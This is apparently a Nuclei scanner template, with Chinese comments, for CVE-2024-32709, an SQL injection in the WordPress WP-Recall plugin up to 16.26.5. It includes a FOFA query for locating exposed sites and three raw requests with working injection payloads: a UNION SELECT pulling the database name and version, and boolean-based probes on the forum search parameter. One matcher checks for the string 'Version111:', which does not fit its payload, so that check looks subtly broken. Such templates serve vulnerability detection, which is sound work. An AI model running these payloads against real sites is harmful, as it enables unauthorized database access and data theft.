id: CVE-2024-32709 # 

info:
  name: WordPress WP-Recall 插件 <= 16.26.5 - SQL 注入漏洞 # 必填，漏洞名
  author: k3ppf0r # 必填，作者
  severity: critical # 必填，严重程度，critical, high, medium, low, info
  description: |
    Plechev Andrey WP-Recall存在SQL注入漏洞。该漏洞影响WP-Recall版本从n/a到16.26.5。攻击者可以利用该漏洞在SQL命令中不恰当地中立化特殊元素，造成数据库被恶意操作的风险。
  reference:
    -  https://patchstack.com/database/vulnerability/wp-recall/wordpress-wp-recall-plugin-16-26-5-sql-injection-vulnerability?_s_id=cve
  remediation: |
    建议您更新当前系统或软件至最新版，完成漏洞的修复。
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:L
    cvss-score: 9.3
    cve-id: CVE-2024-32709
    cwe-id: CWE-89
    # cpe: # 可选：cpe:2.3:a:vmware:spring_cloud_function:*:*:*:*:*:*:*:*
  metadata:
    date: 2024-04-24 # 必填，纰漏时间，例：2019-09-22
    version: |
      WP-Recall version <= 16.26.5
    fofa-query: body="wp-recall/assets" && body="WordPress"
  tags: cve,cve2024,WordPress,WP-Recall,1day

flow: http(1) || http(2) || http(3)

# nuclei -t .\CVE-2024-32709.yaml -v -u http://192.168.136.131:8080
http:
  - raw:
      - |
        GET /account/?user=1&tab=groups&group-name=p'+or+'%'='%'+union+all+select+1,2,3,4,5,6,7,8,9,10,11,concat("Database:",database(),0x7c,"Version:",version()),13--+- HTTP/1.1
        Host: {{Hostname}}
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close

    matchers:
      - type: dsl
        name: "check1"
        dsl:
          - 'status_code == 200'
          - 'contains(body, "Version111:")'
        condition: and

  - method: GET
    path:
      - "{{BaseURL}}/forum/?fs=.%'+or+if(1=1,'%',1)='"

    matchers:
      - type: dsl
        name: "check2"
        dsl:
          - status_code == 200
          - contains((body), 'Search:')
        condition: and
  
  - method: GET
    path:
      - "{{BaseURL}}/forum/?fs=.%'+or+if(1=2,'%',1)='"

    matchers:
      - type: dsl
        name: "check3"
        dsl:
          - status_code == 200
          - contains((body), 'Search:')
        condition: and
          




